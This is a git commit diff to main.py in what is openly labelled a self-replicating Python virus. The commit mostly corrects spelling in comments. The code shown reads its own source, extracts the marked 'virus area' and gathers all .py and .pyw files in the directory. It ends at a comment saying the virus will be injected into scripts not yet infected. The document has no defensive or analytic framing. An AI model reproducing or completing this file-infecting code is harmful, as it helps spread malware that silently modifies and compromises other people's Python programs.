0151911bef2c5431bd25a8414dd8813f0ed35cdd
Ioannis Lazaridis <devblack@DESKTOP-GGP1QFH.localdomain>
2020-11-08 18:17:09 +0200

    Go through all the scripts  and check if infected

--- main.py
+++ main.py
@@ -1,14 +1,14 @@
-#Start of Virus ###
+### Start of Virus ###
 
 import sys, glob
 
-# Findign the code of the current file ###
+# Finding the code of the current file ###
 code = []
 with open(sys.argv[0], 'r') as f:
     lines = f.readlines()
 
 # Finding the code of Virus area"
-virus_area = False  # Beacuse We are not in the virus area ###
+virus_area = False  # Because We are not in the virus area
 for line in lines:
     if line == '### Start of Virus ###\n':
         virus_area = True
@@ -17,8 +17,7 @@ for line in lines:
     if line == '### End of Virus ###\n':
         break
 
-# ## Finding python scripts  by extensions ('.pyw' is the extension for python scripts that run without a visible
-# window) ###
+# Finding python scripts  by extensions ('.pyw' is the extension for python scripts that run without a visible window)
 python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
 
 # Go through all the scripts  and check if infected , if not then inject the  virus code area
